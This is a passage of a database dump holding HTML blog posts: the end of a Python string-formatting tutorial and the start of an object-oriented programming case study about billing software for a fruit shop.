style=\"text-align: justify;\"><span style=\"white-space: pre;\"><br></span></div></code></pre>\r\n\r\n <script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\r\n					<ins class=\"adsbygoogle\"\r\n     						style=\"display:block; text-align:center;\"\r\n     						data-ad-layout=\"in-article\"\r\n     						data-ad-format=\"fluid\"\r\n     						data-ad-client=\"ca-pub-5181933327362047\"\r\n    		 				data-ad-slot=\"2832571695\">\r\n    		 			</ins>\r\n					<script>\r\n     						(adsbygoogle = window.adsbygoogle || []).push({});\r\n					</script>\r\n	     \r\n<h3>\r\n</h3><h3 style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/52ef4073-e7d1-4c44-9e23-c9915f5a4a84.jpg\" style=\"width: 100%;\"><br></h3><h3 style=\"text-align: justify;\">Truncate using format()</h3>\r\n<h3 style=\"text-align: justify;\">\r\nExample 9:\r\n</h3><p>\r\n</p><p style=\"text-align: justify;\">we can truncate string using .\r\n</p>\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\'{:.10}\'.format(\'Hello Everyone\'))</span></div></code><div style=\"text-align: justify;\"></div></pre>\r\n<p>\r\n</p><p style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/a64c2020-d460-42ae-ad1e-9929b163e9aa.jpg\" style=\"width: 100%;\"><br></p><p style=\"text-align: justify;\">First 10 characters will be printed in the large string.\r\n</p>\r\n<p style=\"text-align: justify;\"> \r\nFew more applications using String Formatting in Print\r\n</p>\r\n<h3 style=\"text-align: justify;\">\r\nExample 10:</h3>\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"1 X 9 = {:&gt;2}\".format(\'5\'))</span></div><div style=\"text-align: justify;\"></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"2 X 9 = {:&gt;2}\".format(\'10\'))</span></div><div style=\"text-align: justify;\"></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"3 X 9 = {:&gt;2}\".format(\'15\'))</span></div><div style=\"text-align: justify;\"></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"4 X 9 = {:&gt;2}\".format(\'20\'))</span></div><div style=\"text-align: justify;\"></div><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"5 X 9 = {:&gt;2}\".format(\'25\'))</span></div><div style=\"text-align: justify;\"></div></code><div style=\"text-align: justify;\"></div></pre>\r\n<p style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/715eebba-b98d-46fa-b7cc-72669e6fe3f1.jpg\" style=\"width: 100%;\"><br></p><p style=\"text-align: justify;\">Print Multiplication table in with Alignment</p>\r\n<p style=\"text-align: justify;\">\r\nyou can see that answers in the table are right aligned by format() method.</p>\r\n\r\n<h3 style=\"text-align: justify;\">Example 11:</h3>\r\n<h3 style=\"text-align: justify;\">\r\nBilling Information</h3>\r\n<pre><div style=\"text-align: justify;\"><span style=\"white-space: pre-wrap;\"><br></span></div><code><div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"{:20} {:^5} {:&gt;5} {:&gt;6}\".format(\'Product\', \'Price\', \'Qty\', \'Amount\' ))</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"{:20} {:&gt;5} {:&gt;5} {:&gt;6}\".format(\'Hard Disk\', \'200\', \'1\', \'200\' ))</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"{:20} {:&gt;5} {:&gt;5} {:&gt;6}\".format(\'Keyboard\', \'150\',\'10\', \'1500\' ))</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"{:20} {:&gt;5} {:&gt;5} {:&gt;6}\".format(\'Mouse\',\'100\', \'2\', \'200\' ))</span></div><div style=\"text-align: justify;\"></div>\r\n<div style=\"text-align: justify;\"><span style=\"background-color: transparent; color: inherit; font-size: inherit;\">print(\"{:20} {:&gt;5} {:&gt;5} {:&gt;6}\".format(\'Total\', \'\',\'\', \'1900\' ))</span></div></code><div style=\"text-align: justify;\"></div></pre>\r\n\r\n<p>\r\n\r\n</p><p style=\"text-align: justify;\"><img src=\"/media/django-summernote/2020-06-02/c7f2c4d6-e9eb-4d1e-b2ee-7600147e0390.jpg\" style=\"width: 100%;\"><br></p><p style=\"text-align: justify;\">Here also, Products are properly left aligned and others are right aligned.\r\n</p><p style=\"text-align: justify;\">\r\nWe have learned string output formatting in this article, and we will learn the formatting of numbers and input formatting in coming posts.</p><p></p>','2020-06-02 14:38:01.442962',2,'banner_python_6VD1vkz.jpg'),(3,'OOPS CASE STUDY 1','oops-case-study-1','<div align=\"center\">\r\n\r\n<table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\">\r\n <tbody><tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Faculty Name<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border:solid windowtext 1.0pt;\r\n  border-left:none;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\r\n  solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Mr. P. N. Ramesh<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Course Code / Title<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black\">CS8392</span><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\n  mso-bidi-font-weight:bold\">&amp;Object Oriented Programming<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Focus Area<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:bold\">OOPS based\r\n  Design and Development of Solutions<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Learning Outcome<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:bold\">Design a OOP\r\n  based application for the given requirements<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Teaching Pedagogy <o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Case Study &amp; Discussion<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Knowledge Level<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"text-align:justify;tab-stops:117.0pt\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">K3<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n</tbody></table></div><div align=\"center\" style=\"text-align: left; \"><br></div><div align=\"center\"><p class=\"MsoNormal\" style=\"text-align:justify\"><b><u><span style=\"font-size:\r\n12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Instructions to students:</span></u></b></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\">Read the Problem Description\r\ncarefully and understand the Scenario and Class Diagram.<b><u><o:p></o:p></u></b></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"margin-left:.75in;mso-add-space:\r\nauto;text-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\">2.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\">Read the implementation details\r\nand understand the requirements you need to implement.<b><u><o:p></o:p></u></b></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpLast\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\">3.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;</span></span><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\">Demo.java file contains all the\r\nnecessary classes and the classes are partially coded to implement the given\r\nscenario.</span></p><p class=\"MsoListParagraphCxSpLast\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\"><b><u><o:p></o:p></u></b></span></p><p class=\"MsoNormal\" style=\"text-align:justify\"><b><u><span style=\"font-size:\r\n12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Guidelines:</span></u></b></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">You should only code your program at the space mentioned\r\nas “//Replace Your Code”.<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"margin-left:.75in;mso-add-space:\r\nauto;text-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\">2.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">Your Code should satisfy the requirements specified\r\nin the Implementation Details.<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpLast\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\">3.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">Don’t add additional methods in any class.</span></p><p class=\"MsoListParagraphCxSpLast\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\"><o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align:justify\"><b><span style=\"font-size:12.0pt;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">NOTE: NOT adhering to the above\r\ninstructions and guidelines may lead to drastic reduction in your score even if\r\nthe code is executing without any errors</span></b></p><p class=\"MsoNormal\" style=\"text-align:justify\"><b><u><span style=\"font-size:\r\n12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Problem Description:</span></u></b></p><p class=\"MsoNormal\" style=\"text-align:justify\"><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">“A to Z Fruit Shop” is a\r\ngrowing fruit shop in Coimbatore city. Since they are offering quality and\r\nfresh fruits to customers in best price, their customer strength is increasing\r\ntremendously. In this regard they need billing software to provide a fast and\r\naccurate service. Billing software also supports high to maintain sales data.</span></em></p><p class=\"MsoNormal\" style=\"text-align:justify\"><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><b><u><o:p></o:p></u></b></span></em></p><p class=\"MsoNormal\" style=\"text-align: left; \"><em><b><u><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">Business\r\nRules:</span></u></b></em></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><!--[if !supportLists]--><em><span style=\"font-size:12.0pt;color:black;mso-themecolor:text1\">1.<span style=\"font-style: normal; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span></em><!--[endif]--><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">Every item stock should be\r\nverified for availability before billing.<o:p></o:p></span></em></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; text-indent: -0.25in;\"><!--[if !supportLists]--><em><span style=\"font-size:12.0pt;color:black;mso-themecolor:text1\">2.<span style=\"font-style: normal; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span></em><!--[endif]--><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">5% discount should be\r\nprovided for purchase more than Rs. 500/-<o:p></o:p></span></em></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; text-indent: -0.25in;\"><!--[if !supportLists]--><em><span style=\"font-size:12.0pt;color:black;mso-themecolor:text1\">3.<span style=\"font-style: normal; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span></em><!--[endif]--><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">All fruits except banana are\r\nselling for price-per-kilo gram.<o:p></o:p></span></em></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align: left; text-indent: -0.25in;\"><!--[if !supportLists]--><em><span style=\"font-size:12.0pt;color:black;mso-themecolor:text1\">4.<span style=\"font-style: normal; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span></em><!--[endif]--><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">Selling Banana for\r\nprice-per-piece.<o:p></o:p></span></em></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left;\"><img src=\"/media/django-summernote/2022-07-27/e7f0a448-9d1b-4d2a-8198-fce18447965e.png\" style=\"width: 679px;\"><img src=\"/media/django-summernote/2022-07-27/85715eed-3dde-4488-9ba4-bed1bd46a3fa.png\" style=\"width: 679px;\"></p></div><div align=\"center\"><p class=\"MsoNormal\"></p><p class=\"MsoNormal\" style=\"margin-right:1.0in;text-align:justify\"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Rules:</span></u></b></p><p class=\"MsoNormal\" style=\"margin-right:1.0in;text-align:justify\"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Don’t add additional instance variable in the given\r\nclass.</span></p><p class=\"MsoListParagraph\" style=\"text-align:justify;text-indent:-.25in;\r\nmso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:bold\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp;<span style=\"font-size: 12pt;\">2.</span>&nbsp; </span></span><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">Do Type conversions wherever it is necessary.</span></p><p class=\"MsoListParagraph\" style=\"text-align:justify;text-indent:-.25in;\r\nmso-list:l0 level1 lfo1\"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"><span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp;</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp; &nbsp; 3. Don’t make change in the Demo Class.</span></p><p class=\"MsoNormal\" style=\"text-align:justify\"><b><u><span style=\"font-size:\r\n12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Implementation Details:<o:p></o:p></span></u></b></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b><u>Fruit\r\nClass<o:p></o:p></u></b></span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This class is already\r\ncoded for you.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Fruitingms Class<o:p></o:p></span></u></b></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; margin-left: 1.25in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;</span></span><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Write constructor\r\nmethod <b>fruitingms()</b>for this class.<b><u><o:p></o:p></u></b></span></p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align: left; margin-left: 1.25in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;</span></span><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Write <b>Check _availability()</b> method which\r\ntakes “<b>need</b>” in kilograms as input\r\nand returns false if <b>available_kgs</b>\r\nis less than “<b>need”</b> else return\r\ntrue.</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">&nbsp; </span></p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align: left; margin-left: 1.25in; text-indent: -0.25in;\"><span style=\"font-family: Wingdings; font-size: 16px;\">Ø</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">&nbsp;Write </span><b style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">update_availability\r\n()</b><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\"> method which takes </span><b style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">“need”</b><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\"> in\r\nkilograms as input and reduce this </span><b style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">“need”</b><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">\r\nfrom </span><b style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">available_kgs</b><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Fruitinpcs Class<o:p></o:p></span></u></b></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; margin-left: 1.25in; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; 